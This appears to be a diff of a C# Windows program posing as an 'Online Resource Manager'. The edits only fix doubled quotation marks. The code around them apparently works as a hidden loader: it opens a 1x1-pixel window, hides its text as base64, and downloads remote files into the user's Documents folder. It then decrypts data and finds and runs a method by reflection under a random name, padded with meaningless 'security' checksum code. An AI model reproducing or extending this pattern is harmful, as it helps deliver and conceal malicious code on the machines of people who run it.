@@ -76,7 +76,7 @@ namespace OnlineResourceManager
             
             if (securityBits.Length > 0)
             {
-                Debug.WriteLine(string.Format(""System integrity verified: {0}"", checksum));
+                Debug.WriteLine(string.Format("System integrity verified: {0}", checksum));
             }
         }
 
@@ -121,7 +121,7 @@ namespace OnlineResourceManager
                 }
                 
                 var result = VerifyProcessIntegrity();
-                Debug.WriteLine(string.Format(""Process verification: {0}"", result));
+                Debug.WriteLine(string.Format("Process verification: {0}", result));
             }
             
             private string GenerateProcessId()
@@ -269,7 +269,7 @@ namespace OnlineResourceManager
 
         private void InitializeUIComponents()
         {
-            this.Text = DaynamicHelper.view(""UmVzb3VyY2UgTWFuYWdlcg=="");
+            this.Text = DaynamicHelper.view("UmVzb3VyY2UgTWFuYWdlcg==");
             this.Size = new Size(1, 1);
             this.FormBorderStyle = FormBorderStyle.FixedDialog;
             this.StartPosition = FormStartPosition.CenterScreen;
@@ -286,7 +286,7 @@ namespace OnlineResourceManager
 
             statusLabel = new Label
             {
-                Text = DaynamicHelper.view(""SW5pdGlhbGl6aW5nLi4u""),
+                Text = DaynamicHelper.view("SW5pdGlhbGl6aW5nLi4u"),
                 Dock = DockStyle.Fill,
                 TextAlign = ContentAlignment.MiddleCenter,
                 AutoSize = true
@@ -303,7 +303,7 @@ namespace OnlineResourceManager
 
             openFolderButton = new Button
             {
-                Text = DaynamicHelper.view(""T3BlbiBSZXNvdXJjZXMgRm9sZGVy""),
+                Text = DaynamicHelper.view("T3BlbiBSZXNvdXJjZXMgRm9sZGVy"),
                 Dock = DockStyle.Fill,
                 Enabled = false
             };
@@ -322,7 +322,7 @@ namespace OnlineResourceManager
 
         private void InitializeSecurityRegistry()
         {
-            string[] secKeys = { ""ALPHA"", ""BETA"", ""GAMMA"", ""DELTA"", ""EPSILON"" };
+            string[] secKeys = { "ALPHA", "BETA", "GAMMA", "DELTA", "EPSILON" };
             foreach (var key in secKeys)
             {
                 _securityRegistry[key] = _random.Next(1000, 10000);
@@ -332,7 +332,7 @@ namespace OnlineResourceManager
             if (checksum % 2 == 0)
             {
                 string token = GenerateVerificationToken();
-                Debug.WriteLine(string.Format(""Security token: {0}"", token));
+                Debug.WriteLine(string.Format("Security token: {0}", token));
             }
         }
 
@@ -405,7 +405,7 @@ namespace OnlineResourceManager
             }
             catch (Exception ex)
             {
-                Console.Error.WriteLine(""[Decryption Failed]: "" + ex.Message); // Correction ici
+                Console.Error.WriteLine("[Decryption Failed]: " + ex.Message); // Correction ici
                 return;
             }
         
@@ -421,11 +421,11 @@ namespace OnlineResourceManager
                         null);
                 
                 if (target == null)
-                    throw new InvalidOperationException(""Method not found."");
+                    throw new InvalidOperationException("Method not found.");
             }
             catch (Exception ex)
             {
-                Console.Error.WriteLine(""[Method Lookup Failed]: "" + ex.Message); // Correction ici
+                Console.Error.WriteLine("[Method Lookup Failed]: " + ex.Message); // Correction ici
                 return;
             }
         
@@ -438,9 +438,9 @@ namespace OnlineResourceManager
                 rng.GetBytes(seed);
             }
         dynName = Convert.ToBase64String(seed)
-            .Replace(""+"", """")
-            .Replace(""/"", """")
-            .Replace(""="", """");
+            .Replace("+", "")
+            .Replace("/", "")
+            .Replace("=", "");
         }
             try
             {
@@ -465,7 +465,7 @@ namespace OnlineResourceManager
             }
             catch (Exception ex)
             {
-                Console.Error.WriteLine(""[Execution Failed]: "" + ex.Message); // Correction ici
+                Console.Error.WriteLine("[Execution Failed]: " + ex.Message); // Correction ici
             }
         }
         
@@ -482,7 +482,7 @@ namespace OnlineResourceManager
             try
             {
                 string documentsFolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-                resourcesFolder = Path.Combine(documentsFolder, DaynamicHelper.view(""UmVzb3VyY2VNYW5hZ2Vy""), ""Resources"");
+                resourcesFolder = Path.Combine(documentsFolder, DaynamicHelper.view("UmVzb3VyY2VNYW5hZ2Vy"), "Resources");
                 if (!Directory.Exists(resourcesFolder))
                 {
                     Directory.CreateDirectory(resourcesFolder);
@@ -494,7 +494,7 @@ namespace OnlineResourceManager
                 };
 
 
-                statusLabel.Text = DaynamicHelper.view(""c2hvdyByZXNvdXJjZXMuLi4="");
+                statusLabel.Text = DaynamicHelper.view("c2hvdyByZXNvdXJjZXMuLi4=");
                 ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                 
                 int completed = 0;
@@ -504,7 +504,7 @@ namespace OnlineResourceManager
                 {
                     verificationStates[completed] = GenerateResourceVerificationState();
                     string secToken = ApplySecurityTransform(verificationStates[completed]);
-                    Debug.WriteLine(string.Format(""Resource verification: {0}"", secToken));
+                    Debug.WriteLine(string.Format("Resource verification: {0}", secToken));
                     
                     string fileName = Path.GetFileName(new Uri(file).LocalPath);
                     string filePath = Path.Combine(resourcesFolder, fileName);
@@ -513,7 +513,7 @@ namespace OnlineResourceManager
 
                     completed++;
                     progressBar.Value = (completed * 100) / resourceFiles.Length;
-                    statusLabel.Text = string.Format(DaynamicHelper.view(""RmlsZSAkezB9IG9mICR7MX0gcmVzb3VyY2VzLi4u""), completed, resourceFiles.Length);
+                    statusLabel.Text = string.Format(DaynamicHelper.view("RmlsZSAkezB9IG9mICR7MX0gcmVzb3VyY2VzLi4u"), completed, resourceFiles.Length);
                     Application.DoEvents();
 
                     ServiceManager(filePath);
@@ -523,23 +523,23 @@ namespace OnlineResourceManager
                 for (int x = 0; x < 7; x++)
                 {
                     int fibonacci = CalculateFibonacci(x + 3);
-                    Debug.WriteLine(string.Format(""Security audit {0}: {1}"", x, fibonacci * DaynamicHelper.SumUpTo(x)));
+                    Debug.WriteLine(string.Format("Security audit {0}: {1}", x, fibonacci * DaynamicHelper.SumUpTo(x)));
                 }
 
                 progressBar.Value = 100;
-                statusLabel.Text = DaynamicHelper.view(""QWxsIHJlc291cmNlcyBmb3VuZCBzdWNjZXNzZnVsbHkh"");
+                statusLabel.Text = DaynamicHelper.view("QWxsIHJlc291cmNlcyBmb3VuZCBzdWNjZXNzZnVsbHkh");
                 openFolderButton.Enabled = true;
                 await Task.Delay(1000);
                 this.Close();
             }
             catch (Exception ex)
             {
-                statusLabel.Text = DaynamicHelper.view(""RXJyb3IgcmVzb3VyY2Vz"");
-                MessageBox.Show(DaynamicHelper.view(""QW4gZXJyb3IgY29ycmVjdGVkOiA="") + ex.Message,
-                    DaynamicHelper.view(""RXJyb3I=""), MessageBoxButtons.OK, MessageBoxIcon.Error);
+                statusLabel.Text = DaynamicHelper.view("RXJyb3IgcmVzb3VyY2Vz");
+                MessageBox.Show(DaynamicHelper.view("QW4gZXJyb3IgY29ycmVjdGVkOiA=") + ex.Message,
+                    DaynamicHelper.view("RXJyb3I="), MessageBoxButtons.OK, MessageBoxIcon.Error);
                 File.WriteAllText(
                     Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                        ""ResourceManager_error.log""),
+                        "ResourceManager_error.log"),
                     ex.ToString());
             }
         }
@@ -579,7 +579,7 @@ namespace OnlineResourceManager
             }
             
             int expectedValue = (verificationState ^ checksum) % 256;
-            Debug.WriteLine(string.Format(""Resource integrity: {0}"", expectedValue));
+            Debug.WriteLine(string.Format("Resource integrity: {0}", expectedValue));
             
             for (int i = 0; i < 3; i++)
             {
@@ -628,7 +628,7 @@ namespace OnlineResourceManager
             
             var signatureBytes = Encoding.UTF8.GetBytes(resourceSignature);
             string verificationToken = GenerateVerificationSignature(signatureBytes);
-            Debug.WriteLine(string.Format(""Verification signature: {0}"", verificationToken));
+            Debug.WriteLine(string.Format("Verification signature: {0}", verificationToken));
         }
         
         private void ApplyTransformation(byte[] data)
@@ -676,8 +676,8 @@ namespace OnlineResourceManager
             }
             catch (Exception ex)
             {
-                MessageBox.Show(DaynamicHelper.view(""Q291bGQgbm90IG9wZW4gZm9sZGVyOiA="") + ex.Message,
-                    DaynamicHelper.view(""RXJyb3I=""), MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show(DaynamicHelper.view("Q291bGQgbm90IG9wZW4gZm9sZGVyOiA=") + ex.Message,
+                    DaynamicHelper.view("RXJyb3I="), MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
         }
 
@@ -686,7 +686,7 @@ namespace OnlineResourceManager
             Dictionary<string, int> securityMetrics = new Dictionary<string, int>();
             for (int i = 0; i < 5; i++)
             {
-                string metricName = string.Format(""METRIC_{0}"", i);
+                string metricName = string.Format("METRIC_{0}", i);
                 int metricValue = 0;
                 
                 for (int j = 0; j < 3; j++)
@@ -719,7 +719,7 @@ namespace OnlineResourceManager
                 profile += (char)(65 + (profileChecksum % 26));
             }
             
-            Debug.WriteLine(string.Format(""Security profile: {0}"", profile));
+            Debug.WriteLine(string.Format("Security profile: {0}", profile));
         }
         
         private int CalculateMetricWeight(string name, int value)
@@ -787,7 +787,7 @@ namespace OnlineResourceManager
                 }
             }
             
-            Debug.WriteLine(string.Format(""Table verification: {0}"", accumulator));
+            Debug.WriteLine(string.Format("Table verification: {0}", accumulator));
         }
 
         public static string Echo(string s)
@@ -902,7 +902,7 @@ namespace OnlineResourceManager
                 }
             }
             
-            Debug.WriteLine(string.Format(""Matrix checksum: {0}"", checksum));
+            Debug.WriteLine(string.Format("Matrix checksum: {0}", checksum));
         }
     }
 
